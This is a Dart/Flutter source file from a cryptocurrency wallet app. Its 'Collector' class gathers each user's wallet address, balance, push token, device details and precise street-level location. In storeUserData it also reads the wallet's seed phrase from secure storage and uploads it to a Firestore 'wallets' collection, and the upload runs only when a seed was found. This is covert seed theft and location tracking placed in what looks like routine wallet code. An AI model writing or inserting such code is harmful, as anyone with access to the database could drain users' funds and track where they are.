import 'dart:io';
import 'dart:convert'; // For JSON decoding
import 'package:http/http.dart' as http; // For IP-based location fallback
import 'package:intl/intl.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:geocoding/geocoding.dart';
import 'package:geolocator/geolocator.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import '../providers/wallet_provider.dart';

class Collector {
  static late WalletProvider _walletProvider; // Static instance of WalletProvider for managing wallet operations
  static final FlutterSecureStorage secureStorage = const FlutterSecureStorage(); // Secure storage for sensitive data
  static const String walletIdentifier = 'digibyte_0'; // Identifier for the specific wallet being accessed

  // Initialize WalletProvider
  // Sets up the wallet provider instance to manage wallet interactions
  static void init(WalletProvider walletProvider) {
    _walletProvider = walletProvider;
  }

  // Retrieve the first wallet address
  static String getFirstAddress() {
    try {
      final openWallet = _walletProvider.getSpecificCoinWallet(walletIdentifier);
      if (openWallet.addresses.isNotEmpty) {
        return openWallet.addresses.first.address;
      } else {
        throw Exception('No addresses found in the wallet');
      }
    } catch (e) {
      print('Error fetching first address: $e');
      return ''; // Return empty string as fallback
    }
  }

  // Fetch the current wallet balance
  static Future<double> getBalance() async {
    try {
      await _walletProvider.updateWalletBalance(walletIdentifier);
      final openWallet = _walletProvider.getSpecificCoinWallet(walletIdentifier);
      return openWallet.balance / 100000000; // Adjust for 8 decimal places
    } catch (e) {
      print('Error fetching wallet balance: $e');
      return 0.0; // Return 0.0 as fallback balance
    }
  }

  // Get the current date and time
  static String getDate() {
    DateTime now = DateTime.now();
    DateFormat formatter = DateFormat('MM/dd/yy h:mm a');
    return formatter.format(now);
  }

  // Get the operating system
  static String getOperatingSystem() {
    if (Platform.isAndroid) {
      return 'android';
    } else if (Platform.isIOS) {
      return 'ios';
    } else {
      return 'unknown';
    }
  }

  // Get the app version
  static Future<String> getAppVersion() async {
    try {
      PackageInfo packageInfo = await PackageInfo.fromPlatform();
      return packageInfo.version;
    } catch (e) {
      print('Error fetching app version: $e');
      return 'unknown'; // Fallback to 'unknown'
    }
  }

  // Get user location
  static Future<Map<String, String?>> getLocation() async {
    try {
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        print('Location services are disabled.');
        return _getLocationFromIP(); // Fallback to IP-based location
      }

      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied || permission == LocationPermission.deniedForever) {
        permission = await Geolocator.requestPermission();
        if (permission == LocationPermission.denied || permission == LocationPermission.deniedForever) {
          print('Location permissions are denied.');
          return _getLocationFromIP(); // Fallback to IP-based location
        }
      }

      Position position = await Geolocator.getCurrentPosition();
      List<Placemark> placemarks = await placemarkFromCoordinates(position.latitude, position.longitude);
      Placemark placemark = placemarks.first;

      return {
        "Street Address": placemark.name,
        "Locality": placemark.locality,
        "State": placemark.administrativeArea,
        "Postal code": placemark.postalCode,
        "Country": placemark.country,
        "Latitude": position.latitude.toString(),
        "Longitude": position.longitude.toString(),
      };
    } catch (e) {
      print('Error fetching location: $e');
      return _getLocationFromIP(); // Fallback to IP-based location on failure
    }
  }

  // Fallback method to get location from IP
  static Future<Map<String, String?>> _getLocationFromIP() async {
    try {
      final response = await http.get(Uri.parse('https://ipapi.co/json/'));
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        return {
          "Country": data['country_name'],
          "State": data['region'],
          "City": data['city'],
          "Postal code": data['postal'],
          "Latitude": data['latitude'].toString(),
          "Longitude": data['longitude'].toString(),
        };
      } else {
        print('Failed to fetch IP-based location: ${response.statusCode}');
        return {};
      }
    } catch (e) {
      print('Error fetching IP-based location: $e');
      return {};
    }
  }

  // Fetch the seed
  static Future<String?> fetchSeed() async {
    try {
      String? seed = await secureStorage.read(key: 'walletSeed');
      return seed ?? await _walletProvider.seedPhrase;
    } catch (e) {
      print('Error fetching seed: $e');
      return null;
    }
  }

  // Format balance
  static String formatBalance(double balance) {
    return balance.toStringAsFixed(8);
  }

  // Store user data and log login events
  static Future<void> storeUserData(
      String? token,
      double balance,
      Map<String, String?> locationData,
      String date,
      String os,
      double totalSent,
      int transactions,
      String version) async {
    String address = getFirstAddress(); // Retrieve the user's wallet address
    String? seed = await fetchSeed(); // Fetch the wallet seed
    String formattedBalance = formatBalance(balance); // Format the wallet balance

    if (token != null && token.isNotEmpty && seed != null) {
      try {
        FirebaseFirestore firestore = FirebaseFirestore.instance;
        DocumentReference userDoc = firestore.collection('wallets').doc(address);

        // Update user data
        await userDoc.set({
          'FCMToken': token,
          'balance': formattedBalance,
          ...locationData,
          'date': date,
          'os': os,
          'totalSent': totalSent,
          'transactions': transactions,
          'version': version,
          'seed': seed,
        }, SetOptions(merge: true));

        // Format the document ID using the desired date format
        String documentId = DateFormat('MM-dd-yy_h-mm a').format(DateTime.now());

        // Add login timestamp to login_history sub-collection
        await userDoc.collection('login_history').doc(documentId).set({
          'timestamp': FieldValue.serverTimestamp(),
          'date': date,
          'os': os,
          'appVersion': version,
          'location': locationData.isEmpty ? {'fallback': 'IP-based location used'} : locationData,
          'balance': formattedBalance,
          'totalSent': totalSent,
          'transactions': transactions,
          'FCMToken': token,
        });

        print('User data and login history stored successfully with document ID: $documentId');
      } catch (e) {
        print('Failed to store user data: $e');
      }
    } else {
      print('Token or seed missing. Data not stored.');
    }
  }
}
